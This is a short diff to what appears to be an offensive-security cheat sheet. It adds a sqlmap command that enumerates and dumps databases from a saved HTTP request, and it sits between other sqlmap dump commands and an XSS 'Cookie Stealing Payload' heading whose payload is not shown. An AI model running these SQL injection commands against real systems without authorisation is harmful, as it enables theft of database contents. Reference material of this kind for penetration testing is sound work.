@@ -461,6 +461,10 @@ sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> --tables --batch
 sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> -T <TABLE_NAME> --dump --batch
 ```
 
+```bash
+sqlmap -r <REQUEST> --dbs --dump
+```
+
 # Cross-Site Scripting (XSS)
 
 ## Cookie Stealing Payload
